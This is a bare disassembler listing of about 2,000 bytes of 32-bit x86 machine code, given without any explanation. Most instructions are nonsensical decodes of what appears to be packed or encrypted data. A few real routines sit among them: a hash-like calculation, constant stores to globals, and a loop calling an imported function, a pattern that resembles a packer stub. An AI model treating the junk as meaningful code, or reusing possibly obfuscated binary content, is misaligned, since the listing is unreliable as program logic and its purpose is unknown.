  4060e0:	sti    
  4060e1:	in     eax,dx
  4060e2:	push   ecx
  4060e3:	or     esp,DWORD PTR [eax+0x22]
  4060e6:	xor    ch,bh
  4060e8:	ins    BYTE PTR es:[edi],dx
  4060e9:	call   0xecb48a0d
  4060ee:	jl     0x406114
  4060f0:	inc    bh
  4060f2:	pop    eax
  4060f3:	aam    0x97
  4060f5:	fsubr  QWORD PTR [ecx+ebp*4-0x7f]
  4060f9:	sub    edx,DWORD PTR [edi+ebx*1+0x1a433b88]
  406100:	dec    edx
  406101:	mov    BYTE PTR [eax],ah
  406103:	cmp    bh,BYTE PTR ds:0x1e28ca83
  406109:	ins    BYTE PTR es:[edi],dx
  40610a:	call   0x3e63:0x949cef05
  406111:	repnz in eax,dx
  406113:	add    DWORD PTR [edx+0x5d],esi
  406116:	js     0x4060ae
  406118:	lahf   
  406119:	scas   eax,DWORD PTR es:[edi]
  40611a:	cs out 0x4b,eax
  40611d:	mov    esi,0x91fdeec
  406122:	loop   0x406169
  406124:	dec    ecx
  406125:	mov    cl,0xb
  406127:	test   eax,0x68fd4f82
  40612c:	inc    esi
  40612d:	add    eax,0x44e2cc37
  406132:	pop    ebx
  406133:	(bad)  
  406134:	xchg   ebx,eax
  406135:	ret    
  406136:	or     DWORD PTR ds:0x5f4be3ee,edx
  40613c:	jne    0x4060f6
  40613e:	(bad)  
  40613f:	fistp  WORD PTR [ebp-0x50522e44]
  406145:	(bad)  
  406146:	push   edi
  406147:	xchg   ebp,eax
  406148:	push   ebx
  406149:	retf   0x4e24
  40614c:	cdq    
  40614d:	imul   edi,DWORD PTR [eax-0x2fab1c66],0xee1c702b
  406157:	outs   dx,DWORD PTR ds:[esi]
  406158:	inc    eax
  406159:	or     DWORD PTR [ebx+0xa70d962],ecx
  40615f:	push   esp
  406160:	cdq    
  406161:	and    DWORD PTR [esi-0x78],ebp
  406164:	xchg   edx,eax
  406165:	xchg   esi,eax
  406166:	dec    ebx
  406167:	into   
  406168:	xor    dl,BYTE PTR [edi-0x738f85a7]
  40616e:	popf   
  40616f:	dec    eax
  406170:	push   eax
  406171:	or     eax,0x97e3ebde
  406176:	pusha  
  406177:	jecxz  0x406178
  406179:	inc    ecx
  40617a:	xor    ebx,esp
  40617c:	pop    es
  40617d:	aam    0x2d
  40617f:	sub    ebx,ebx
  406181:	push   ds
  406182:	rcl    DWORD PTR [esi-0x70a49918],cl
  406188:	lahf   
  406189:	popf   
  40618a:	mov    eax,0x5c76db41
  40618f:	inc    ebp
  406190:	or     dh,0x5b
  406193:	mov    ebp,DWORD PTR [ebp-0x6d48cab0]
  406199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40619a:	daa    
  40619b:	xor    al,0xd9
  40619d:	rcl    BYTE PTR [eax+eiz*4-0x56],cl
  4061a1:	rol    BYTE PTR [esi*2-0x57fba30e],0xda
  4061a9:	fstp   QWORD PTR [edi-0x4a]
  4061ac:	mov    ebp,0x457d4372
  4061b1:	and    BYTE PTR [edx-0x2539f65f],0xf
  4061b8:	in     eax,dx
  4061b9:	imul   ebp,DWORD PTR [ecx],0xffffff83
  4061bc:	dec    ebx
  4061bd:	jb     0x4061a6
  4061bf:	cs stos DWORD PTR es:[di],eax
  4061c2:	sub    al,0x77
  4061c4:	sbb    eax,0xacdadefa
  4061c9:	data16 add BYTE PTR [esi+0x6e],ah
  4061cd:	adc    ebp,esp
  4061cf:	add    al,0xf1
  4061d1:	(bad)  [eax-0x4e2c9b09]
  4061d7:	mov    esi,0x262b8047
  4061dc:	push   cs
  4061dd:	push   ebx
  4061de:	ftst   
  4061e0:	clc    
  4061e1:	cmp    bh,BYTE PTR [ebx+esi*4+0x43c5d2bc]
  4061e8:	add    eax,DWORD PTR [esi+0x9155a6c]
  4061ee:	fbld   TBYTE PTR [ebp-0x3a]
  4061f1:	das    
  4061f2:	add    al,0x96
  4061f4:	sub    ebp,esi
  4061f6:	div    DWORD PTR [esi-0x18]
  4061f9:	sub    ecx,DWORD PTR [ecx+0x40]
  4061fc:	aaa    
  4061fd:	out    dx,al
  4061fe:	dec    esi
  4061ff:	inc    edx
  406200:	jmp    0x4061e6
  406202:	inc    edx
  406203:	mov    ebx,0x13e9a4a
  406208:	popa   
  406209:	add    BYTE PTR [eax-0x25],dl
  40620c:	fnsave [ecx+0x21]
  40620f:	je     0x406249
  406211:	into   
  406212:	aas    
  406213:	pop    edi
  406214:	or     BYTE PTR [ebx],0xab
  406217:	fisttp QWORD PTR [esi+eax*8-0x40]
  40621b:	cwde   
  40621c:	mov    bl,0xb9
  40621e:	or     ch,BYTE PTR [ecx]
  406220:	xchg   esi,eax
  406221:	outs   dx,DWORD PTR ds:[esi]
  406222:	leave  
  406223:	das    
  406224:	dec    esp
  406225:	imul   esp,DWORD PTR [ecx],0x26
  406228:	mov    eax,ds:0x322e80aa
  40622d:	stos   DWORD PTR es:[edi],eax
  40622e:	sub    ebx,ebx
  406230:	mov    esi,0xe42f488e
  406235:	mov    dl,0x30
  406237:	xchg   BYTE PTR [ebp+0x35],dl
  40623a:	fwait
  40623b:	pop    ds
  40623c:	retf   0x92ce
  40623f:	stos   DWORD PTR es:[edi],eax
  406240:	sub    DWORD PTR [ebp-0x4b],0xffffff8e
  406244:	add    eax,0xec199422
  406249:	xchg   DWORD PTR [eax-0x31f0c179],eax
  40624f:	loope  0x40628e
  406251:	js     0x406226
  406253:	jae    0x406203
  406255:	loope  0x40624e
  406257:	repnz pop ebx
  406259:	lock cmp eax,0x91a99657
  40625f:	mov    dl,0x7d
  406261:	sub    BYTE PTR [ecx+0x5ca9d44c],dh
  406267:	ins    BYTE PTR es:[edi],dx
  406268:	dec    edx
  406269:	stc    
  40626a:	cmp    al,0x31
  40626c:	in     eax,dx
  40626d:	fs cli 
  40626f:	inc    esp
  406270:	cld    
  406271:	or     DWORD PTR [edi+ebx*2+0x65b3d6e1],ebp
  406278:	or     cl,BYTE PTR [ebx+0x1dc16781]
  40627e:	in     al,dx
  40627f:	fbstp  TBYTE PTR [ecx+0x58f0aae2]
  406285:	inc    eax
  406286:	not    BYTE PTR [ecx]
  406288:	into   
  406289:	sbb    dh,BYTE PTR [eax]
  40628b:	push   0x3364ac43
  406290:	aad    0x3
  406292:	push   ss
  406293:	aad    0xf6
  406295:	pop    ss
  406296:	dec    BYTE PTR [eax+eax*1-0x75]
  40629a:	jne    0x406294
  40629c:	xor    eax,edx
  40629e:	xor    esi,edx
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43369f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	pop    esp
  4062ed:	jp     0x406286
  4062ef:	mov    edx,0x7c7c3b34
  4062f4:	xor    BYTE PTR [esi+0x7c],bh
  4062f7:	jl     0x406356
  4062f9:	mov    ds:0x3e166e88,al
  4062fe:	add    DWORD PTR ds:0x243f34bd,ebx
  406304:	adc    al,0xf1
  406306:	sub    ebx,DWORD PTR [eax-0x6966bf65]
  40630c:	jmp    0x82b7:0x2327f6a2
  406313:	and    edx,DWORD PTR [ecx-0x1a]
  406316:	test   al,0xff
  406318:	ret    0xd67c
  40631b:	push   ebp
  40631c:	push   ds
  40631d:	cmp    al,0xd5
  40631f:	cwde   
  406320:	push   0x5ec55fb8
  406325:	and    al,0x16
  406327:	jo     0x4062de
  406329:	xor    edi,DWORD PTR [ebp+0x312b53c5]
  40632f:	add    al,ah
  406331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406332:	in     al,0x1f
  406334:	jo     0x4063a4
  406336:	xchg   dh,dl
  406338:	or     DWORD PTR [edx],esp
  40633a:	mov    ch,0x6a
  40633c:	fist   DWORD PTR [eax+0x6ad81331]
  406342:	es clc 
  406344:	sub    edx,edx
  406346:	mov    ss,WORD PTR [edx]
  406348:	or     eax,0x96580435
  40634d:	dec    edi
  40634e:	into   
  40634f:	jmp    0xbd77282c
  406354:	fst    QWORD PTR [ecx-0x1e]
  406357:	xchg   edx,eax
  406358:	adc    ch,BYTE PTR [edi]
  40635a:	aas    
  40635b:	dec    esp
  40635c:	sbb    esi,DWORD PTR ds:0x2767f09d
  406362:	jg     0x40638a
  406364:	js     0x40637c
  406366:	add    dl,0xb9
  406369:	xchg   DWORD PTR [ecx+eax*4],ecx
  40636c:	cdq    
  40636d:	cld    
  40636e:	add    al,0xf1
  406370:	and    edx,0xe59291c
  406376:	int3   
  406377:	les    di,DWORD PTR [esi-0x12a6ac67]
  40637e:	outs   dx,BYTE PTR ds:[esi]
  40637f:	pop    es
  406380:	mov    ds:0x2393cd45,al
  406385:	xchg   ecx,eax
  406386:	outs   dx,DWORD PTR ds:[esi]
  406387:	sti    
  406388:	or     al,0x25
  40638b:	xchg   ecx,eax
  40638c:	mov    ah,0xc5
  40638e:	fsubr  DWORD PTR [ebp-0x6]
  406391:	lock dec ebx
  406393:	clc    
  406394:	stos   BYTE PTR es:[edi],al
  406395:	inc    ebp
  406396:	push   ebp
  406397:	pushf  
  406398:	out    0x31,al
  40639a:	test   esp,ebx
  40639c:	int3   
  40639d:	call   0x59d5:0x40eae2b2
  4063a4:	popf   
  4063a5:	mov    ds:0xa8f2599f,al
  4063aa:	icebp  
  4063ab:	add    eax,0x935b5d0c
  4063b0:	mov    dh,0x4c
  4063b2:	fnstcw WORD PTR ds:0x3dd58bf9
  4063b8:	neg    BYTE PTR [ebp+0x5b]
  4063bb:	cmp    eax,0xfffa5855
  4063c0:	pop    edi
  4063c1:	xor    al,0xe8
  4063c3:	arpl   WORD PTR [ecx+0x6976ac02],ax
  4063c9:	mov    eax,ds:0xe4d04b24
  4063ce:	mov    esp,0xfcff4917
  4063d3:	inc    ebp
  4063d4:	xchg   ecx,eax
  4063d5:	sub    al,0x74
  4063d7:	fmul   QWORD PTR [edi]
  4063d9:	sbb    eax,0x9e2280dc
  4063de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063df:	rcl    BYTE PTR [ecx-0x78c38c07],1
  4063e5:	sbb    ebx,DWORD PTR [ecx+0x35]
  4063e8:	cli    
  4063e9:	mov    esp,0x1c1dd156
  4063ee:	inc    esp
  4063ef:	adc    DWORD PTR [ecx],esi
  4063f1:	test   eax,0xc5bd3846
  4063f6:	jle    0x4063f1
  4063f8:	outs   dx,BYTE PTR ds:[esi]
  4063f9:	repnz cmp al,0x4e
  4063fc:	fld    TBYTE PTR [ebx-0x67]
  4063ff:	mov    BYTE PTR [edx-0x76],cl
  406402:	es jbe 0x4063f8
  406405:	adc    al,0x1
  406407:	shl    edx,1
  406409:	or     BYTE PTR [eax-0x66b89f82],ah
  40640f:	mov    esp,0x4c37a697
  406414:	pusha  
  406415:	or     esp,edx
  406417:	mov    dl,BYTE PTR [esi]
  406419:	pop    eax
  40641a:	jae    0x406457
  40641c:	jp     0x406404
  40641e:	aaa    
  40641f:	mov    al,0x58
  406421:	push   ecx
  406422:	or     al,0xe4
  406424:	and    eax,0x34d7b655
  406429:	xchg   DWORD PTR [ebx-0x44198074],edx
  40642f:	jg     0x40646d
  406431:	ins    BYTE PTR es:[edi],dx
  406432:	rcl    DWORD PTR [edx-0x31],cl
  406435:	dec    esi
  406436:	fmul   st,st(0)
  406438:	or     ebp,esp
  40643a:	jbe    0x406421
  40643c:	getsec 
  40643e:	cmp    dl,BYTE PTR [edi+0x31]
  406441:	pop    esi
  406442:	loop   0x4063d2
  406444:	dec    ebp
  406445:	jnp    0x4063f2
  406447:	fisubr WORD PTR [eax]
  406449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40644a:	pusha  
  40644b:	jg     0x40646e
  40644d:	add    esp,edi
  40644f:	xor    BYTE PTR [edi+0xd513ede],dh
  406455:	cmp    DWORD PTR [edi-0x254d731e],esi
  40645b:	cmp    eax,0xab3cc5f6
  406460:	pop    eax
  406461:	aas    
  406462:	(bad)  
  406464:	xor    DWORD PTR [esi],eax
  406466:	ins    DWORD PTR es:[edi],dx
  406467:	shr    DWORD PTR [esi-0x6ecc1584],0x3d
  40646e:	add    eax,0x5c3171a0
  406473:	or     BYTE PTR [esi-0x87a7c74],ah
  406479:	call   FWORD PTR [edi]
  40647b:	mov    ds:0x95e60fef,eax
  406480:	sub    ch,BYTE PTR [bp+di+0x72]
  406484:	js     0x406482
  406486:	jmp    0xd00d:0x83c8689b
  40648d:	aas    
  40648e:	and    ah,BYTE PTR [edx+0x6abd6691]
  406494:	cwde   
  406495:	xchg   ebx,eax
  406496:	lahf   
  406497:	sub    eax,ecx
  406499:	fiadd  WORD PTR [edx+0x21bb2610]
  40649f:	jecxz  0x406517
  4064a1:	inc    edx
  4064a2:	je     0x406457
  4064a4:	repnz sub BYTE PTR [ecx+ecx*8-0x4f04552d],bl
  4064ac:	inc    eax
  4064ad:	loope  0x406509
  4064af:	jg     0x40651a
  4064b1:	mov    esp,0x46de4827
  4064b6:	(bad)  
  4064b7:	stos   DWORD PTR es:[edi],eax
  4064b8:	mov    bh,0xcf
  4064ba:	lea    eax,[edx-0x72f827fa]
  4064c0:	inc    eax
  4064c1:	or     eax,edx
  4064c3:	(bad)  
  4064c4:	(bad)  
  4064c5:	(bad)  
  4064c6:	adc    eax,0xac407ca8
  4064cb:	cld    
  4064cc:	pop    es
  4064cd:	lods   al,BYTE PTR ds:[esi]
  4064ce:	mov    ah,0x23
  4064d0:	cmp    edx,DWORD PTR [esi+0x24]
  4064d3:	push   ebx
  4064d4:	adc    al,0x1f
  4064d6:	adc    esp,esi
  4064d8:	(bad)  
  4064d9:	iret   
  4064da:	(bad)  
  4064dc:	icebp  
  4064dd:	xor    ebp,0xe4c1b099
  4064e3:	push   0x5
  4064e5:	jae    0x40646a
  4064e7:	mov    esi,0xb1f9a2d1
  4064ec:	add    BYTE PTR [ecx-0x7a],0x33
  4064f0:	mov    WORD PTR [ecx],cs
  4064f2:	fdiv   DWORD PTR [esi-0x444b329c]
  4064f8:	stos   BYTE PTR es:[edi],al
  4064f9:	push   edx
  4064fa:	inc    edx
  4064fb:	arpl   WORD PTR [edi-0x53e19b65],ax
  406501:	(bad)  
  406502:	add    dh,BYTE PTR ds:[ecx-0x75200160]
  406509:	int    0xca
  40650b:	jae    0x406588
  40650d:	mov    al,ds:0xa0338af
  406512:	stos   DWORD PTR es:[edi],eax
  406513:	xor    dl,BYTE PTR [edi+0x437a2796]
  406519:	cmp    BYTE PTR [edi+0x48],cl
  40651c:	jg     0x4064c0
  40651e:	mov    ebx,0xd7898d13
  406524:	cmp    edi,DWORD PTR [ecx]
  406526:	and    BYTE PTR ds:0xdb06cbb,ch
  40652c:	inc    esp
  40652d:	inc    edi
  40652e:	ins    DWORD PTR es:[edi],dx
  40652f:	pop    ds
  406530:	out    0xa,al
  406532:	les    ebp,FWORD PTR [esi+0x51]
  406535:	mov    eax,0x4881
  40653a:	mov    eax,0x5a3fc9e
  40653f:	mov    DWORD PTR [ebp-0x4],eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x4336a7,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x43375f,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x43365b,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x4336df,0x0
  406580:	mov    ecx,DWORD PTR ds:0x4336df
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x4336df,ecx
  40658d:	cmp    DWORD PTR ds:0x4336df,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x4336df,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x4336df
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x4336df,ecx
  4065bf:	cmp    DWORD PTR ds:0x4336df,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0x8195211a
  4065de:	rol    BYTE PTR [ebp+0x7cc5e801],0x7c
  4065e5:	xor    BYTE PTR [esi+0x7c],bh
  4065e8:	jl     0x40659b
  4065ea:	dec    ecx
  4065eb:	in     eax,0x78
  4065ed:	and    bh,0xe9
  4065f0:	add    eax,0x77585f54
  4065f5:	mov    esi,0xaaf8f5e9
  4065fa:	ret    0xeb71
  4065fd:	xchg   edi,eax
  4065fe:	push   esp
  4065ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406600:	xchg   esi,eax
  406601:	pusha  
  406602:	sbb    dh,bl
  406604:	lock jp 0x406630
  406607:	mov    ebp,0x2cab839e
  40660c:	gs retf 
  40660e:	mov    ebp,DWORD PTR [edi]
  406610:	mov    esi,0x1fc4487
  406615:	(bad)  
  406617:	add    DWORD PTR [eax+ebp*4+0x8],esi
  40661b:	fs mov bh,dh
  40661e:	jmp    0x4065ea
  406620:	sti    
  406621:	(bad)  
  406623:	in     eax,0x94
  406625:	or     ecx,DWORD PTR ds:0x1db25a74
  40662b:	jecxz  0x406612
  40662d:	push   0x36faca3c
  406632:	fwait
  406633:	push   esp
  406634:	mov    ds:0x1fa585d6,eax
  406639:	repz or BYTE PTR [esi-0x43],bh
  40663d:	xor    bh,dl
  40663f:	sub    eax,0x9f1d951c
  406644:	jge    0x406681
  406646:	lods   al,BYTE PTR ds:[esi]
  406647:	sbb    eax,0x3fc726b3
  40664c:	or     BYTE PTR [edi],ah
  40664e:	test   DWORD PTR [edx+0x34a253ab],edx
  406654:	adc    DWORD PTR [eax],ebp
  406656:	or     BYTE PTR [esi],0x3c
  406659:	push   ds
  40665a:	ins    DWORD PTR es:[di],dx
  40665c:	not    ah
  40665e:	hlt    
  40665f:	(bad)  
  406661:	mov    dl,0xcc
  406663:	adc    cl,BYTE PTR [edx]
  406665:	repnz sub dh,dl
  406668:	retf   0x221b
  40666b:	mov    ds:0xbf3f73bb,eax
  406670:	or     edi,DWORD PTR [eax-0x1faa93e3]
  406676:	in     eax,dx
  406677:	or     esi,edx
  406679:	jg     0x40663a
  40667b:	xchg   esi,eax
  40667c:	fidivr WORD PTR [ebp-0x1b9e20ac]
  406682:	mov    bl,BYTE PTR [eax-0x37995c0b]
  406688:	xchg   ebx,eax
  406689:	hlt    
  40668a:	stc    
  40668b:	sbb    BYTE PTR [eax-0x7f],bh
  40668e:	pop    ds
  40668f:	jge    0x40665c
  406691:	call   0xafd44357
  406696:	or     edx,DWORD PTR [ebp-0x1ea5160c]
  40669c:	test   ecx,ecx
  40669e:	mov    al,ds:0x80c26ca0
  4066a3:	stos   BYTE PTR es:[edi],al
  4066a4:	fs jmp 0x70f17d7
  4066aa:	hlt    
  4066ab:	(bad)
  4066af:	add    DWORD PTR [esi+0x37491a6b],edx
  4066b5:	stc    
  4066b6:	test   eax,0x857769fe
  4066bb:	js     0x406695
  4066bd:	jnp    0x40670d
  4066bf:	ds retf 0x885f
  4066c3:	popf   
  4066c4:	int    0xe9
  4066c6:	push   0x4a48b991
  4066cb:	cmp    eax,0x37381c60
  4066d0:	and    DWORD PTR [esi+0x160b2c59],esp
  4066d6:	clc    
  4066d7:	std    
  4066d8:	lods   eax,DWORD PTR ds:[esi]
  4066d9:	stos   DWORD PTR es:[edi],eax
  4066da:	sub    DWORD PTR [edi],esi
  4066dc:	ret    0xc2ea
  4066df:	mov    ds:0xe87ace49,eax
  4066e4:	push   edx
  4066e5:	push   edi
  4066e6:	out    dx,eax
  4066e7:	pop    eax
  4066e8:	jo     0x406690
  4066ea:	pop    ss
  4066eb:	and    BYTE PTR [esi+0x77df33d5],ch
  4066f1:	cs sub eax,0x5cdd2cac
  4066f7:	adc    edx,DWORD PTR ds:0x54f922f7
  4066fd:	fidivr WORD PTR [ebx]
  4066ff:	push   edi
  406700:	mov    ah,0x12
  406702:	sub    eax,0xb7d739f5
  406707:	fstp   DWORD PTR [edi]
  406709:	sub    DWORD PTR [esi-0x30],edi
  40670c:	push   ss
  40670d:	or     cl,ah
  40670f:	push   esp
  406710:	pushf  
  406711:	test   BYTE PTR [esi-0x7053aae2],cl
  406717:	push   esp
  406718:	(bad)  
  406719:	fstp   TBYTE PTR [esi-0x70]
  40671c:	add    al,BYTE PTR [esi-0xf]
  40671f:	shr    BYTE PTR fs:[ebx-0x5c54391a],cl
  406726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406727:	mov    bh,0xe1
  406729:	hlt    
  40672a:	fisttp QWORD PTR [esi-0xa]
  40672d:	dec    ecx
  40672e:	xor    edx,DWORD PTR [esi+0x5e]
  406731:	iret   
  406732:	bound  ebx,QWORD PTR [edx+0x22]
  406735:	cmp    BYTE PTR [eax+0x13],ah
  406738:	mov    esp,esp
  40673a:	ret    0x16a2
  40673d:	inc    ebx
  40673e:	cwde   
  40673f:	into   
  406740:	mov    bh,0x50
  406742:	outs   dx,BYTE PTR ds:[esi]
  406743:	stc    
  406744:	into   
  406745:	out    dx,al
  406746:	xchg   ebp,eax
  406747:	xchg   esi,eax
  406748:	js     0x40670a
  40674a:	push   edx
  40674b:	popa   
  40674c:	icebp  
  40674d:	aad    0x61
  40674f:	or     BYTE PTR [ebx+0x1],cl
  406752:	into   
  406753:	std    
  406754:	(bad)  
  406756:	xor    ecx,DWORD PTR [ebx]
  406758:	clc    
  406759:	pop    ds
  40675a:	xchg   eax,eax
  40675c:	repnz and eax,0x94aeb2a4
  406762:	push   edx
  406763:	mov    eax,ds:0x2e7d3e2d
  406768:	mov    eax,0xd754560c
  40676d:	or     eax,0x78c2d516
  406772:	in     al,0xf6
  406774:	fwait
  406775:	std    
  406776:	adc    eax,0x1a8266b6
  40677b:	mov    es,WORD PTR [esi+0x2a]
  40677e:	pusha  
  40677f:	aaa    
  406780:	loop   0x4067c2
  406782:	stos   BYTE PTR es:[edi],al
  406783:	mov    ds:0xdc11df42,al
  406788:	int3   
  406789:	in     eax,0x5e
  40678b:	sub    ch,BYTE PTR [ebx+0x6f]
  40678e:	add    edx,ebx
  406790:	dec    ebx
  406791:	and    al,0x23
  406793:	iret   
  406794:	xor    ch,BYTE PTR [eax+ebp*4+0x15967fd1]
  40679b:	data16 lahf 
  40679d:	(bad)  
  40679e:	sub    BYTE PTR [edx],cl
  4067a0:	xor    dh,cl
  4067a2:	(bad)  
  4067a3:	jmp    0x86791195
  4067a8:	retf   
  4067a9:	js     0x406829
  4067ab:	xchg   esi,eax
  4067ac:	mov    ecx,0x15ba65da
  4067b1:	sti    
  4067b2:	sub    ecx,DWORD PTR [edx]
  4067b4:	icebp  
  4067b5:	cld    
  4067b6:	arpl   ax,si
  4067b8:	test   edx,esi
  4067ba:	test   bh,dl
  4067bc:	jnp    0x40676e
  4067be:	push   ss
  4067bf:	pop    edi
  4067c0:	ret    0x5d81
  4067c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067c4:	imul   ecx,ebx,0x2b
  4067c7:	loope  0x406848
  4067c9:	mov    ebp,0xac6414e6
  4067ce:	mov    bl,0xb9
  4067d1:	test   ch,ch
  4067d3:	iret   
  4067d4:	stos   DWORD PTR es:[edi],eax
  4067d5:	lock add bh,BYTE PTR [edi]
  4067d8:	sbb    DWORD PTR [esi+0x5f9741c1],edi
  4067de:	das    
  4067df:	mov    eax,ds:0x520e65
  4067e4:	out    0x86,al
  4067e6:	dec    ebx
  4067e7:	ja     0x406837
  4067e9:	and    al,0x23
  4067eb:	lahf   
  4067ec:	sbb    BYTE PTR [eax-0x157b0c9a],0x77
  4067f3:	shl    bl,1
  4067f5:	repnz adc al,0x6b
  4067f8:	add    eax,0x66e9e9bf
  4067fd:	dec    edx
  4067fe:	push   cs
  4067ff:	jae    0x4067de
  406801:	int    0xae
  406803:	and    al,0xd6
  406805:	jmp    0x8720:0xf9c154f9
  40680c:	inc    edx
  40680d:	fld    TBYTE PTR [edi+0xd356f36]
  406813:	cld    
  406814:	(bad)  
  406815:	pop    edi
  406816:	into   
  406817:	fisttp QWORD PTR [edi+0xa5c7409]
  40681d:	push   ecx
  40681e:	push   es
  40681f:	mov    bh,BYTE PTR [ebx]
  406821:	adc    al,0x7a
  406823:	(bad)  
  406826:	cmp    cl,BYTE PTR [edx+0x54e90000]
  40682c:	add    al,BYTE PTR [eax]
  40682e:	add    BYTE PTR [eax],cl
  406830:	int3   
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0x9986c5cb
  40683e:	mov    ebp,0x7c7cc7ac
  406843:	xor    BYTE PTR [esi+0x7c],bh
  406846:	jl     0x406875
  406848:	xchg   edx,eax
  406849:	jg     0x406822
  40684b:	jnp    0x40680a
  40684d:	mov    dl,0x9d
  40684f:	mov    al,ds:0x3261f9bf
  406854:	mov    dh,al
  406856:	call   0x518:0xb23641eb
  40685d:	and    dl,BYTE PTR [eax]
  40685f:	or     ch,BYTE PTR [edx]
  406861:	push   esp
  406862:	mov    BYTE PTR [edx-0x7694695],al
  406868:	lods   eax,DWORD PTR ds:[esi]
  406869:	sar    DWORD PTR [ecx+esi*1],1
  40686c:	dec    ebx
  40686d:	mov    esp,0x58cf2a10
  406872:	jge    0x40688c
  406874:	mov    ecx,0x209827c5
  406879:	mov    dh,0xd9
  40687b:	(bad)  
  40687c:	sti    
  40687d:	mov    ebx,DWORD PTR [ecx+0x3a2da9fb]
  406883:	jnp    0x4068ec
  406885:	or     eax,0x23699862
  40688a:	lea    edi,[ecx]
  40688c:	inc    edi
  40688d:	add    DWORD PTR [eax],ecx
  40688f:	fld    DWORD PTR [eax]
  406891:	push   cs
  406892:	jmp    DWORD PTR [bp+di]
  406895:	sub    al,0xcb
  406897:	popf   
  406898:	inc    edx
  406899:	es je  0x40689d
  40689c:	ins    BYTE PTR es:[edi],dx
  40689d:	lods   al,BYTE PTR ds:[esi]
  40689e:	jmp    0x4068f5
  4068a0:	ja     0x40690a
  4068a2:	cmovl  esi,DWORD PTR [ecx]
  4068a5:	test   al,0x92
  4068a7:	adc    dh,BYTE PTR [edx-0x6e]
  4068aa:	outs   dx,DWORD PTR ds:[esi]
  4068ab:	test   al,0x39
  4068ad:	jbe    0x406910
  4068af:	inc    ebp
  4068b0:	fiadd  WORD PTR [ecx+0x19]
  4068b3:	test   eax,0x9b53bd76
  4068b8:	xchg   ebp,eax
  4068b9:	or     edx,DWORD PTR [edx+0xe]
  4068bc:	fstp   TBYTE PTR [ebx+0x7e]
  4068bf:	cmc    
  4068c0:	int    0xad
  4068c2:	aad    0x65
  4068c4:	out    dx,al
  4068c5:	push   ebp
  4068c6:	mov    ?,esi
  4068c8:	xchg   edi,eax
  4068c9:	jb     0x4068a9
  4068cb:	retf   0xa0f1
  4068ce:	arpl   WORD PTR [ebp-0x21],bp
  4068d1:	shl    BYTE PTR [ebp+0x58],cl
  4068d4:	dec    edx
  4068d5:	dec    edi
  4068d6:	popa   
  4068d7:	js     0x4068b1
  4068d9:	sbb    al,BYTE PTR [edx]
  4068db:	test   BYTE PTR [edx],ah
  4068dd:	test   BYTE PTR fs:[bx+di+0x5089],ch
  4068e3:	fsubrp st(6),st
  4068e5:	jns    0x406944
  4068e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e8:	xchg   ebx,edi
  4068ea:	mov    dh,0x2
  4068ec:	arpl   WORD PTR [edx-0x32],cx
  4068ef:	xchg   edx,eax
  4068f0:	adc    bl,BYTE PTR [esi+esi*2-0x2c4bd129]
  4068f7:	repz push 0xffffffa6
  4068fa:	xchg   edi,eax
  4068fb:	sbb    ax,0xbfd0
  4068ff:	and    al,0x52
  406901:	dec    edx
  406902:	(bad)  
  406903:	cs or  ax,0x7cb6
  406908:	sahf   
  406909:	repnz out 0x40,al
  40690c:	fidiv  DWORD PTR [ebp+esi*2-0x6dc664a6]
  406913:	out    0xd6,eax
  406915:	mov    bl,BYTE PTR [ecx+0x51]
  406918:	inc    eax
  406919:	lods   eax,DWORD PTR ds:[esi]
  40691a:	mov    ebx,esp
  40691c:	xor    al,0x7
  40691e:	dec    esp
  40691f:	mov    BYTE PTR [ecx+0x19],al
  406922:	in     al,0x71
  406924:	and    al,0x44
  406926:	and    eax,0xd7f29f65
  40692b:	and    DWORD PTR [edx],ecx
  40692d:	and    eax,0x785a7efc
  406932:	aas    
  406933:	std    
  406934:	mov    edi,fs
  406936:	or     al,0xc0
  406938:	sub    BYTE PTR [ecx-0x6136f2da],0x4b
  40693f:	push   edi
  406940:	push   ecx
  406941:	adc    BYTE PTR [ebp+0x491c9e56],0x25
